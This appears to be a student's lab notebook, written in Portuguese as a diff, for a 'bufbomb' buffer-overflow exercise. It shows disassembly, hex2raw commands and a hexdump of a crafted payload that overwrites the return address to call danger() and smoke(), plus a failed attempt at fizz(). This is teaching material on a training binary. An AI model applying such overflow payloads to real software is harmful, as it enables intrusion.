@@ -1,0 +1,83 @@
+
+ao forçar flags pra desabilitar proteções, recebi o retorno:
+make: *** No rule to make target 'clean'.  Stop.
+make: *** No rule to make target 'bufbomb'.  Stop.
+
+ao executar ./bufbomb ana, recebi permission denied
+pra resolver, fiz isso:
+    ls -l ./bufbomb
+    -> -rw-rw-rw- 1 codespace codespace 16544 Nov  6 13:12 ./bufbomb
+    como não ha o x, significa que o arquivo não é executavel, resolvi fazendo: chmod +x ./bufbomb
+
+Agora, ao fazer ./bufbomb ana, recebo: buf: 0x7fffffffceb0
+
+objdump -d bufbomb > bufbomb.d
+less bufbomb.d
+    0000000000401206 <danger>:
+    401206:       f3 0f 1e fa             endbr64
+    40120a:       55                      push   %rbp
+    40120b:       48 89 e5                mov    %rsp,%rbp
+    40120e:       48 8d 05 fd 0d 00 00    lea    0xdfd(%rip),%rax 
+
+    0000000000401267 <smoke>:
+    401267:       f3 0f 1e fa             endbr64
+    40126b:       55                      push   %rbp
+    40126c:       48 89 e5                mov    %rsp,%rbp
+    40126f:       48 8d 05 e3 0d 00 00    lea    0xde3(%rip),%rax 
+
+    0000000000401288 <fizz>:
+    401288:       f3 0f 1e fa             endbr64
+    40128c:       55                      push   %rbp
+    40128d:       48 89 e5                mov    %rsp,%rbp
+    401290:       48 83 ec 10             sub    $0x10,%rsp
+    401294:       89 7d fc                mov    %edi,-0x4(%rbp)
+    401297:       81 7d fc 04 03 02 01    cmpl   $0x1020304,-0x4(%rbp)
+    40129e:       75 1b                   jne    4012bb <fizz+0x33>
+    4012a0:       8b 45 fc                mov    -0x4(%rbp),%eax
+    4012a3:       89 c6                   mov    %eax,%esi
+    4012a5:       48 8d 05 c8 0d 00 00    lea    0xdc8(%rip),%rax 
+
+
+Após 
+chmod +x ./hex2raw
+./hex2raw < stringinvasora.txt > stringinvasora.raw
+./bufbomb < stringinvasora.raw
+buf: 0x7fffffffcec0
+
+danger! you called danger()
+
+-> cannot be called without validation!
+Ouch!: You caused a segmentation fault!
+Better luck next time
+
+
+./hex2raw < stringinvasora2.txt > stringinvasora2.raw
+wc -c stringinvasora2.raw   
+
+hexdump -C stringinvasora2.raw | sed -n '1,4p'
+./bufbomb < stringinvasora2.raw
+57 stringinvasora2.raw
+00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
+*
+00000020  42 42 42 42 42 42 42 42  06 12 40 00 00 00 00 00  |BBBBBBBB..@.....|
+00000030  67 12 40 00 00 00 00 00  0a                       |g.@......|
+buf: 0x7fffffffcec0
+
+danger! you called danger()
+
+-> cannot be called without validation!
+Smoke!: You called smoke()
+
+essa execução terminou sem segmentation fault
+
+Após executar o codigo assembly de codigo.s, tivemos:
+
+0000000000000000 <main>:
+   0:   bf 04 03 02 01          mov    $0x1020304,%edi
+   5:   c3                      ret
+
+./hex2raw < stringinvasora3.txt > stringinvasora3.raw
+./bufbomb < stringinvasora3.raw
+
+buf: 0x7fffffffcec0
+Misfire: You called fizz(0xf7fa78e0)
